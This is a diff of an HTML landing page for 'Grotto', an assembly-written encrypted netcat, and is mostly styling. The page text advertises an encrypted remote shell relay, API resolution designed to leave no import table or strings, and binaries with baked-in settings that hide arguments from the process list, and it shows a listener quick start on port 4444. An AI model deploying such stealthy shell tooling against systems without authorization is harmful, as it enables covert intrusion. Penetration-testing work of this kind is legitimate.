+        .cap-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+        .cap-dot.api { background: var(--green); }
+        .cap-dot.net { background: var(--blue); }
+        .cap-dot.chacha { background: var(--teal); }
+        .cap-dot.aead { background: var(--mauve); }
+        .cap-dot.exec { background: var(--peach); }
+        .cap-dot.relay { background: var(--red); }
+
+        .cap-legend {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--overlay1);
+        }
+
+        .cap-legend span {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ── Platform Cards ── */
+        .platform-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .platform-card {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 28px;
+            transition: all 0.25s;
+        }
+
+        .platform-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--surface2);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+        }
+
+        .platform-card h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .platform-card .platform-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 6px 0;
+            font-size: 13px;
+            color: var(--subtext1);
+            line-height: 1.5;
+        }
+
+        .p-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            margin-top: 7px;
+        }
+
+        .p-dot.linux { background: var(--green); }
+        .p-dot.win { background: var(--blue); }
+
+        /* ── Terminal ── */
+        .terminal {
+            background: var(--mantle);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .terminal-bar {
+            background: var(--crust);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--surface0);
+        }
+
+        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .terminal-dot:nth-child(1) { background: var(--red); }
+        .terminal-dot:nth-child(2) { background: var(--yellow); }
+        .terminal-dot:nth-child(3) { background: var(--green); }
+        .terminal-label { flex: 1; text-align: center; font-size: 11px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace; }
+
+        .terminal-body {
+            padding: 24px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .terminal-body .p { color: var(--green); }
+        .terminal-body .c { color: var(--overlay0); }
+        .terminal-body .v { color: var(--sapphire); }
+        .terminal-body .f { color: var(--peach); }
+        .terminal-body .s { color: var(--green); }
+
+        /* ── Architecture Diagram ── */
+        .arch-diagram {
+            background: var(--mantle);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow:
+                0 0 0 1px var(--surface0),
+                0 24px 80px -12px rgba(0, 0, 0, 0.5),
+                0 0 120px -40px rgba(116, 199, 236, 0.06);
+        }
+
+        .arch-bar {
+            background: var(--crust);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--surface0);
+        }
+
+        .arch-bar-label { flex: 1; text-align: center; font-size: 11px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace; }
+
+        .arch-body { padding: 32px; }
+
+        .flow-diagram {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            flex-wrap: nowrap;
+        }
+
+        .flow-node {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .flow-node-box {
+            padding: 14px 24px;
+            border: 1px solid var(--surface1);
+            border-radius: 6px;
+            background: var(--base);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--teal);
+            white-space: nowrap;
+        }
+
+        .flow-node-label {
+            font-size: 11px;
+            color: var(--overlay1);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .flow-arrows {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            padding: 0 16px;
+            flex-shrink: 0;
+        }
+
+        .flow-arrow {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--overlay1);
+            white-space: nowrap;
+        }
+
+        .flow-arrow-line {
+            width: 60px;
+            height: 1px;
+            background: var(--surface2);
+            position: relative;
+        }
+
+        .flow-arrow-line::after {
+            content: '';
+            position: absolute;
+            right: -1px;
+            top: -3px;
+            border: 3px solid transparent;
+            border-left: 5px solid var(--surface2);
+        }
+
+        .flow-arrow.left .flow-arrow-line::after {
+            right: auto;
+            left: -1px;
+            border-left: none;
+            border-right: 5px solid var(--surface2);
+        }
+
+        .flow-tag {
+            padding: 2px 8px;
+            border-radius: 3px;
+            background: var(--surface0);
+            font-size: 10px;
+            letter-spacing: 0.04em;
+        }
+
+        .flow-tag.tcp { color: var(--green); }
+        .flow-tag.enc { color: var(--mauve); }
+
+        .arch-divider {
+            border: none;
+            border-top: 1px dashed var(--surface1);
+            margin: 28px 0;
+        }
+
+        /* ── Wire format bar ── */
+        .wire-label {
+            font-size: 12px;
+            color: var(--overlay1);
+            font-weight: 500;
+            margin-bottom: 12px;
+            letter-spacing: 0.04em;
+        }
+
+        .wire-bar {
+            display: flex;
+            border-radius: 6px;
+            overflow: hidden;
+            border: 1px solid var(--surface1);
+        }
+
+        .wire-seg {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 0;
+            gap: 4px;
+            border-right: 1px solid var(--surface1);
+        }
+
+        .wire-seg:last-child { border-right: none; }
+
+        .wire-seg-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .wire-seg-detail {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            opacity: 0.7;
+        }
+
+        .wire-seg.len {
+            flex: 1;
+            background: rgba(148, 226, 213, 0.08);
+            color: var(--teal);
+        }
+
+        .wire-seg.nonce {
+            flex: 1.5;
+            background: rgba(137, 180, 250, 0.08);
+            color: var(--blue);
+        }
+
+        .wire-seg.ct {
+            flex: 3;
+            background: rgba(249, 226, 175, 0.08);
+            color: var(--yellow);
+        }
+
+        .wire-seg.mac {
+            flex: 1.5;
+            background: rgba(203, 166, 247, 0.08);
+            color: var(--mauve);
+        }
+
+        /* ── Footer ── */
+        .site-footer {
+            border-top: 1px solid var(--surface0);
+            padding: 56px 0;
+            text-align: center;
+        }
+
+        .footer-tagline {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--subtext1);
+            margin-bottom: 8px;
+        }
+
+        .footer-sub {
+            font-size: 13px;
+            color: var(--overlay1);
+            margin-bottom: 28px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            color: var(--overlay1);
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover { color: var(--sapphire); }
+
+        .footer-copy {
+            font-size: 12px;
+            color: var(--overlay0);
+        }
+
+        .footer-toolkit {
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--overlay0);
+        }
+
+        .footer-toolkit a {
+            color: var(--overlay1);
+            margin: 0 4px;
+        }
+
+        .footer-toolkit a:hover { color: var(--sapphire); }
+
+        /* ── Responsive ── */
+        @media (max-width: 900px) {
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .features { grid-template-columns: 1fr; }
+            .platform-grid { grid-template-columns: 1fr; }
+            .capabilities { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        @media (max-width: 600px) {
+            .hero { padding: 60px 0 48px; }
+            .hero-logo { max-width: 300px; }
+            .stats { grid-template-columns: 1fr 1fr; }
+            .cta-group { flex-direction: column; align-items: center; }
+            .btn { width: 100%; max-width: 260px; text-align: center; }
+            .flow-diagram { flex-direction: column; gap: 16px; }
+            .flow-arrows { flex-direction: row; padding: 0; }
+            .flow-arrow-line { width: 30px; }
+            .arch-body { padding: 20px; }
+            .terminal-body { padding: 16px; font-size: 12px; }
+            .cap-legend { gap: 12px; }
+        }
+    </style>
 </head>
 <body>
 
-<div class="page-wrap">
+<div class="container">
 
-  <!-- ============ HERO ============ -->
-  <section class="hero" id="top">
-    <div class="hero-terminal">
-      <div class="hero-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="hero-titlebar-text">grotto &mdash;&mdash; encrypted netcat</span>
-      </div>
-      <div class="hero-body">
-        <h1 class="hero-title">Grotto<span class="hero-cursor" aria-hidden="true"></span></h1>
-        <p class="hero-tagline">
-          ChaCha20-Poly1305 encrypted netcat in pure x86_64 assembly.<br>
-          <em>Cross-platform. Zero dependencies. Full AEAD. ~8 KB.</em>
+    <!-- ════════════ HERO ════════════ -->
+    <section class="hero">
+        <div class="hero-logo">
+            <img src="assets/logo-dark.svg" alt="Grotto">
+        </div>
+
+        <p class="subtitle">
+            ChaCha20-Poly1305 authenticated encryption networking tool in pure x86_64 NASM assembly.
+            Cross-platform. Zero dependencies. Full AEAD. ~8 KB.
         </p>
-        <div class="hero-stats">
-          <div class="hero-stat">
-            <div class="hero-stat-value">~8 KB</div>
-            <div class="hero-stat-label">Windows PE</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">~13 KB</div>
-            <div class="hero-stat-label">Linux ELF</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">256-bit</div>
-            <div class="hero-stat-label">PSK Encryption</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">RFC 8439</div>
-            <div class="hero-stat-label">AEAD Standard</div>
-          </div>
-        </div>
-        <div class="hero-buttons">
-          <a href="https://github.com/Real-Fruit-Snacks/Grotto" class="btn btn-primary">View Source</a>
-          <a href="#architecture" class="btn btn-ghost">Read Docs</a>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- ============ FEATURES ============ -->
-  <section id="features">
-    <span class="section-label">// capabilities</span>
-    <h2 class="section-title">Pure assembly. Fully encrypted.</h2>
-    <p class="section-desc">
-      Every byte handcrafted in NASM. No compiler, no runtime, no import table. ChaCha20-Poly1305 AEAD with bidirectional encrypted relay &mdash; Linux and Windows from the same codebase.
-    </p>
-
-    <div class="features-grid">
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128274;</span>
-        <h3>ChaCha20-Poly1305</h3>
-        <p>Full RFC 8439 AEAD in pure assembly. 256-bit PSK, fresh random nonce per message, Poly1305 MAC verification rejects tampered payloads.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#127758;</span>
-        <h3>Cross-Platform</h3>
-        <p>Dual-target build: Linux (~13 KB static ELF) and Windows (~8 KB minimal PE). Shared crypto core, platform-specific networking. Same wire protocol, full interop.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128269;</span>
-        <h3>PEB Walk + Hash Lookup</h3>
-        <p>All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings. Linux uses raw syscalls with no libc.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128260;</span>
-        <h3>Encrypted Shell Relay</h3>
-        <p>The -e flag spawns an interactive shell (cmd.exe or /bin/sh) with stdin/stdout piped through the encrypted channel. Full bidirectional AEAD relay.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128190;</span>
-        <h3>No Dependencies</h3>
-        <p>Zero DLL imports on Windows. No libc on Linux. Every API resolved dynamically from the PEB or via raw syscalls. Nothing to link against.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128293;</span>
-        <h3>Baked Builds</h3>
-        <p>Compile host, port, key, and exec command directly into the binary. Zero arguments at runtime &mdash; nothing visible in the process list. A random PSK is generated if none is provided.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ============ ARCHITECTURE ============ -->
-  <section id="architecture">
-    <span class="section-label">// architecture</span>
-    <h2 class="section-title">Wire protocol &amp; data flow.</h2>
-    <p class="section-desc">
-      Every message is independently encrypted with a fresh 96-bit nonce. The Poly1305 MAC authenticates the ciphertext per RFC 8439 &mdash; any tampered byte is silently rejected.
-    </p>
-
-    <div class="arch-terminal">
-      <div class="arch-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="arch-titlebar-text">grotto &mdash;&mdash; wire protocol</span>
-      </div>
-      <div class="arch-body">
-        <div class="flow-diagram">
-          <div class="flow-node">
-            <div class="flow-node-box">grotto -l</div>
-            <div class="flow-node-label">Listener</div>
-          </div>
-          <div class="flow-arrows">
-            <div class="flow-arrow">
-              <div class="flow-arrow-line"></div>
-              <span class="flow-arrow-tag flow-arrow-tag--tcp">raw TCP</span>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value">~8 KB</div>
+                <div class="stat-label">Windows PE</div>
             </div>
-            <div class="flow-arrow flow-arrow--left">
-              <span class="flow-arrow-tag flow-arrow-tag--enc">encrypted</span>
-              <div class="flow-arrow-line"></div>
+            <div class="stat">
+                <div class="stat-value">~13 KB</div>
+                <div class="stat-label">Linux ELF</div>
             </div>
-            <div class="flow-arrow">
-              <div class="flow-arrow-line"></div>
-              <span class="flow-arrow-tag flow-arrow-tag--enc">encrypted</span>
+            <div class="stat">
+                <div class="stat-value">256-bit</div>
+                <div class="stat-label">PSK Encryption</div>
             </div>
-          </div>
-          <div class="flow-node">
-            <div class="flow-node-box">grotto -c</div>
-            <div class="flow-node-label">Client</div>
-          </div>
+            <div class="stat">
+                <div class="stat-value">RFC 8439</div>
+                <div class="stat-label">AEAD Standard</div>
+            </div>
         </div>
 
-        <hr class="arch-divider">
-
-        <div class="wire-bar-label">Wire Format (per message)</div>
-        <div class="wire-bar">
-          <div class="wire-segment wire-seg--len">
-            <span class="wire-segment-name">len</span>
-            <span class="wire-segment-detail">4B &middot; LE u32</span>
-          </div>
-          <div class="wire-segment wire-seg--nonce">
-            <span class="wire-segment-name">nonce</span>
-            <span class="wire-segment-detail">12B &middot; random</span>
-          </div>
-          <div class="wire-segment wire-seg--ct">
-            <span class="wire-segment-name">ciphertext</span>
-            <span class="wire-segment-detail">N bytes &middot; ChaCha20</span>
-          </div>
-          <div class="wire-segment wire-seg--mac">
-            <span class="wire-segment-name">mac</span>
-            <span class="wire-segment-detail">16B &middot; Poly1305</span>
-          </div>
+        <div class="cta-group">
+            <a href="https://github.com/Real-Fruit-Snacks/Grotto" class="btn btn-primary">View Source</a>
+            <a href="#architecture" class="btn btn-secondary">Architecture</a>
+            <a href="#quick-start" class="btn btn-ghost">Quick Start</a>
         </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- ============ CROSS-PLATFORM ============ -->
-  <section id="platforms">
-    <span class="section-label">// cross-platform</span>
-    <h2 class="section-title">One protocol, two platforms.</h2>
-    <p class="section-desc">
-      Shared crypto core with platform-specific networking, I/O, and shell execution. Linux and Windows binaries interoperate seamlessly over the same encrypted wire protocol.
-    </p>
-
-    <div class="platform-grid">
-      <div class="platform-card">
-        <div class="platform-titlebar">
-          <span class="hero-dot hero-dot--red"></span>
-          <span class="hero-dot hero-dot--yellow"></span>
-          <span class="hero-dot hero-dot--green"></span>
-          <span class="platform-titlebar-text">linux &mdash;&mdash; ~13 KB static ELF</span>
+        <div class="warning">
+            <strong>Authorization Required:</strong> This tool is designed exclusively for authorized security testing
+            with explicit written permission. Unauthorized access to computer systems is illegal and may result in
+            criminal prosecution.
         </div>
-        <div class="platform-body">
-          <h3 style="color: var(--ctp-green);">Linux</h3>
-          <div class="platform-item"><span class="p-dot p-dot--linux"></span> Raw syscalls via syscall instruction</div>
-          <div class="platform-item"><span class="p-dot p-dot--linux"></span> poll(2) multiplexed bidirectional relay</div>
-          <div class="platform-item"><span class="p-dot p-dot--linux"></span> fork/execve/dup2 shell spawning</div>
-          <div class="platform-item"><span class="p-dot p-dot--linux"></span> getrandom for CSPRNG nonces</div>
-          <div class="platform-item"><span class="p-dot p-dot--linux"></span> No libc, no dynamic linking</div>
+    </section>
+
+    <!-- ════════════ FEATURES ════════════ -->
+    <section id="features">
+        <h2>Pure assembly. Fully encrypted.</h2>
+        <p class="section-desc">
+            Every byte handcrafted in NASM. No compiler, no runtime, no import table.
+            ChaCha20-Poly1305 AEAD with bidirectional encrypted relay &mdash; Linux and Windows from the same codebase.
+        </p>
+
+        <div class="features">
+            <div class="feature">
+                <h3>ChaCha20-Poly1305</h3>
+                <p>Full RFC 8439 AEAD in pure assembly. 256-bit PSK, fresh random nonce per message, Poly1305 MAC verification rejects tampered payloads.</p>
+            </div>
+            <div class="feature">
+                <h3>Cross-Platform</h3>
+                <p>Dual-target build: Linux (~13 KB static ELF) and Windows (~8 KB minimal PE). Shared crypto core, platform-specific networking. Same wire protocol, full interop.</p>
+            </div>
+            <div class="feature">
+                <h3>PEB Walk + Hash Lookup</h3>
+                <p>All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings. Linux uses raw syscalls with no libc.</p>
+            </div>
+            <div class="feature">
+                <h3>Encrypted Shell Relay</h3>
+                <p>The -e flag spawns an interactive shell (cmd.exe or /bin/sh) with stdin/stdout piped through the encrypted channel. Full bidirectional AEAD relay.</p>
+            </div>
+            <div class="feature">
+                <h3>No Dependencies</h3>
+                <p>Zero DLL imports on Windows. No libc on Linux. Every API resolved dynamically from the PEB or via raw syscalls. Nothing to link against.</p>
+            </div>
+            <div class="feature">
+                <h3>Baked Builds</h3>
+                <p>Compile host, port, key, and exec command directly into the binary. Zero arguments at runtime &mdash; nothing visible in the process list.</p>
+            </div>
         </div>
-      </div>
+    </section>
 
-      <div class="platform-card">
-        <div class="platform-titlebar">
-          <span class="hero-dot hero-dot--red"></span>
-          <span class="hero-dot hero-dot--yellow"></span>
-          <span class="hero-dot hero-dot--green"></span>
-          <span class="platform-titlebar-text">windows &mdash;&mdash; ~8 KB minimal PE</span>
+    <!-- ════════════ CAPABILITIES ════════════ -->
+    <section id="capabilities">
+        <h2>Every component from scratch.</h2>
+        <p class="section-desc">
+            ~3,800 lines of handwritten x86_64 assembly. Every component implemented from scratch &mdash; no libraries, no dependencies, no shortcuts.
+        </p>
+
+        <div class="capabilities">
+            <div class="capability"><span class="cap-dot api"></span> PEB Walking</div>
+            <div class="capability"><span class="cap-dot api"></span> ror13 Hash Resolution</div>
+            <div class="capability"><span class="cap-dot api"></span> GetProcAddress Fallback</div>
+            <div class="capability"><span class="cap-dot api"></span> Raw Linux Syscalls</div>
+            <div class="capability"><span class="cap-dot net"></span> TCP Socket Layer</div>
+            <div class="capability"><span class="cap-dot net"></span> recv_exact / send_all</div>
+            <div class="capability"><span class="cap-dot net"></span> Winsock2 via PEB</div>
+            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Quarter-Round</div>
+            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Block Cipher</div>
+            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Stream XOR</div>
+            <div class="capability"><span class="cap-dot aead"></span> Poly1305 MAC (mod 2&#xB9;&#xB3;&#x2070;-5)</div>
+            <div class="capability"><span class="cap-dot aead"></span> AEAD Encrypt</div>
+            <div class="capability"><span class="cap-dot aead"></span> AEAD Decrypt + Verify</div>
+            <div class="capability"><span class="cap-dot exec"></span> SystemFunction036 Nonce</div>
+            <div class="capability"><span class="cap-dot exec"></span> getrandom Nonce</div>
+            <div class="capability"><span class="cap-dot exec"></span> CreateProcessA Pipes</div>
+            <div class="capability"><span class="cap-dot exec"></span> fork/execve/dup2 Pipes</div>
+            <div class="capability"><span class="cap-dot relay"></span> poll(2) Event Loop</div>
+            <div class="capability"><span class="cap-dot relay"></span> Threaded Relay</div>
+            <div class="capability"><span class="cap-dot relay"></span> POLLHUP Drain Logic</div>
         </div>
-        <div class="platform-body">
-          <h3 style="color: var(--ctp-blue);">Windows</h3>
-          <div class="platform-item"><span class="p-dot p-dot--win"></span> PEB walk + ror13 API resolution</div>
-          <div class="platform-item"><span class="p-dot p-dot--win"></span> CreateThread + WaitForMultipleObjects relay</div>
-          <div class="platform-item"><span class="p-dot p-dot--win"></span> CreateProcessA with pipe redirection</div>
-          <div class="platform-item"><span class="p-dot p-dot--win"></span> SystemFunction036 for CSPRNG nonces</div>
-          <div class="platform-item"><span class="p-dot p-dot--win"></span> Zero DLL imports, zero strings</div>
+        <div class="cap-legend">
+            <span><span class="cap-dot api" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> API Resolution</span>
+            <span><span class="cap-dot net" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Networking</span>
+            <span><span class="cap-dot chacha" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> ChaCha20</span>
+            <span><span class="cap-dot aead" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> AEAD</span>
+            <span><span class="cap-dot exec" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Execution</span>
+            <span><span class="cap-dot relay" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Relay</span>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ============ INTERNALS ============ -->
-  <section class="capabilities-section" id="internals">
-    <span class="section-label">// internals</span>
-    <h2 class="section-title">Every component from scratch.</h2>
-    <p class="section-desc" style="margin-left:auto;margin-right:auto;">
-      What makes Grotto tick &mdash; every component implemented from scratch in x86_64 assembly.
-    </p>
+    <!-- ════════════ ARCHITECTURE ════════════ -->
+    <section id="architecture">
+        <h2>Wire protocol &amp; data flow.</h2>
+        <p class="section-desc">
+            Every message is independently encrypted with a fresh 96-bit nonce. The Poly1305 MAC authenticates the
+            ciphertext per RFC 8439 &mdash; any tampered byte is silently rejected.
+        </p>
 
-    <div class="capabilities-terminal">
-      <div class="capabilities-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="capabilities-titlebar-text">grotto &mdash;&mdash; component map</span>
-      </div>
-      <div class="capabilities-body">
-        <div class="capabilities-grid">
-          <div class="capability-pill"><span class="dot dot--api"></span> PEB Walking</div>
-          <div class="capability-pill"><span class="dot dot--api"></span> ror13 Hash Resolution</div>
-          <div class="capability-pill"><span class="dot dot--api"></span> GetProcAddress Fallback</div>
-          <div class="capability-pill"><span class="dot dot--api"></span> Raw Linux Syscalls</div>
-          <div class="capability-pill"><span class="dot dot--net"></span> TCP Socket Layer</div>
-          <div class="capability-pill"><span class="dot dot--net"></span> recv_exact / send_all</div>
-          <div class="capability-pill"><span class="dot dot--net"></span> Winsock2 via PEB</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Quarter-Round</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Block Cipher</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Stream XOR</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> Poly1305 MAC (mod 2&#x00B9;&#x00B3;&#x2070;&#x207B;&#x2075;)</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> AEAD Encrypt</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> AEAD Decrypt + Verify</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> SystemFunction036 Nonce</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> getrandom Nonce</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> CreateProcessA Pipes</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> fork/execve/dup2 Pipes</div>
-          <div class="capability-pill"><span class="dot dot--relay"></span> poll(2) Event Loop</div>
-          <div class="capability-pill"><span class="dot dot--relay"></span> Threaded Relay</div>
-          <div class="capability-pill"><span class="dot dot--relay"></span> POLLHUP Drain Logic</div>
+        <div class="arch-diagram">
+            <div class="arch-bar">
+                <span class="terminal-dot"></span>
+                <span class="terminal-dot"></span>
+                <span class="terminal-dot"></span>
+                <span class="arch-bar-label">grotto &mdash; wire protocol</span>
+            </div>
+            <div class="arch-body">
+                <div class="flow-diagram">
+                    <div class="flow-node">
+                        <div class="flow-node-box">grotto -l</div>
+                        <div class="flow-node-label">Listener</div>
+                    </div>
+                    <div class="flow-arrows">
+                        <div class="flow-arrow">
+                            <div class="flow-arrow-line"></div>
+                            <span class="flow-tag tcp">raw TCP</span>
+                        </div>
+                        <div class="flow-arrow left">
+                            <span class="flow-tag enc">encrypted</span>
+                            <div class="flow-arrow-line"></div>
+                        </div>
+                        <div class="flow-arrow">
+                            <div class="flow-arrow-line"></div>
+                            <span class="flow-tag enc">encrypted</span>
+                        </div>
+                    </div>
+                    <div class="flow-node">
+                        <div class="flow-node-box">grotto -c</div>
+                        <div class="flow-node-label">Client</div>
+                    </div>
+                </div>
+
+                <hr class="arch-divider">
+
+                <div class="wire-label">Wire Format (per message)</div>
+                <div class="wire-bar">
+                    <div class="wire-seg len">
+                        <span class="wire-seg-name">len</span>
+                        <span class="wire-seg-detail">4B &middot; LE u32</span>
+                    </div>
+                    <div class="wire-seg nonce">
+                        <span class="wire-seg-name">nonce</span>
+                        <span class="wire-seg-detail">12B &middot; random</span>
+                    </div>
+                    <div class="wire-seg ct">
+                        <span class="wire-seg-name">ciphertext</span>
+                        <span class="wire-seg-detail">N bytes &middot; ChaCha20</span>
+                    </div>
+                    <div class="wire-seg mac">
+                        <span class="wire-seg-name">mac</span>
+                        <span class="wire-seg-detail">16B &middot; Poly1305</span>
+                    </div>
+                </div>
+            </div>
         </div>
-        <div class="capabilities-legend">
-          <span><span class="dot dot--api" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> API Resolution</span>
-          <span><span class="dot dot--net" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Networking</span>
-          <span><span class="dot dot--chacha" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> ChaCha20</span>
-          <span><span class="dot dot--aead" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> AEAD</span>
-          <span><span class="dot dot--exec" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Execution</span>
-          <span><span class="dot dot--relay" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Relay</span>
+    </section>
+
+    <!-- ════════════ CROSS-PLATFORM ════════════ -->
+    <section id="platforms">
+        <h2>One protocol, two platforms.</h2>
+        <p class="section-desc">
+            Shared crypto core with platform-specific networking, I/O, and shell execution.
+            Linux and Windows binaries interoperate seamlessly over the same encrypted wire protocol.
+        </p>
+
+        <div class="platform-grid">
+            <div class="platform-card">
+                <h3 style="color: var(--green);">Linux &mdash; ~13 KB static ELF</h3>
+                <div class="platform-item"><span class="p-dot linux"></span> Raw syscalls via syscall instruction</div>
+                <div class="platform-item"><span class="p-dot linux"></span> poll(2) multiplexed bidirectional relay</div>
+                <div class="platform-item"><span class="p-dot linux"></span> fork/execve/dup2 shell spawning</div>
+                <div class="platform-item"><span class="p-dot linux"></span> getrandom for CSPRNG nonces</div>
+                <div class="platform-item"><span class="p-dot linux"></span> No libc, no dynamic linking</div>
+            </div>
+            <div class="platform-card">
+                <h3 style="color: var(--blue);">Windows &mdash; ~8 KB minimal PE</h3>
+                <div class="platform-item"><span class="p-dot win"></span> PEB walk + ror13 API resolution</div>
+                <div class="platform-item"><span class="p-dot win"></span> CreateThread + WaitForMultipleObjects relay</div>
+                <div class="platform-item"><span class="p-dot win"></span> CreateProcessA with pipe redirection</div>
+                <div class="platform-item"><span class="p-dot win"></span> SystemFunction036 for CSPRNG nonces</div>
+                <div class="platform-item"><span class="p-dot win"></span> Zero DLL imports, zero strings</div>
+            </div>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ============ QUICK START ============ -->
-  <section id="quick-start">
-    <span class="section-label">// quick start</span>
-    <h2 class="section-title">Build and connect.</h2>
-    <p class="section-desc">
-      Generate a 256-bit pre-shared key. Build both targets. Connect with the same key on both ends &mdash; every message encrypted with ChaCha20-Poly1305 AEAD.
-    </p>
+    <!-- ════════════ QUICK START ════════════ -->
+    <section id="quick-start">
+        <h2>Build and connect.</h2>
+        <p class="section-desc">
+            Generate a 256-bit pre-shared key. Build both targets. Connect with the same key on both ends &mdash;
+            every message encrypted with ChaCha20-Poly1305 AEAD.
+        </p>
 
-    <div class="start-terminal">
-      <div class="start-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="start-titlebar-text">bash &mdash;&mdash; build &amp; connect</span>
-      </div>
-      <div class="start-body">
-        <div class="start-line"><span class="comment"># Build both targets (generates random PSK)</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Generate a 256-bit PSK</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">KEY=</span><span class="arg">$(python3 -c "import secrets; print(secrets.token_hex(32))")</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Listener (wait for connection)</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto </span><span class="flag">-l -p </span><span class="arg">4444 </span><span class="flag">-k </span><span class="arg">$KEY</span></div>
-        <div class="start-spacer"></div>
